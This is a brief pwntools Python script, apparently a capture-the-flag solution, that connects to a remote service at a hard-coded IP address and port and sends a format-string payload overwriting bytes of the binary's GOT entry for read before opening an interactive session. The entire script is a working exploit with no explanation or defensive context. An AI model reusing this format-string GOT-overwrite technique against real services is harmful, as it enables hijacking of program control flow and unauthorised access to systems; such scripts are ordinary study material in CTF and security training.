from pwn import*
p = process('./main')
p = remote('124.156.121.112',28086)
libc =ELF('./libc-2.23.so')
elf =ELF('./main')
payload  = '%82c%12$hhn' + '%82c%13$hhn'
payload  = payload.ljust(0x20,'\x00')
payload += p64(elf.got['read'] + 1) + p64(elf.got['read'])
p.sendline(payload)
p.sendline('FMYY')
p.interactive()
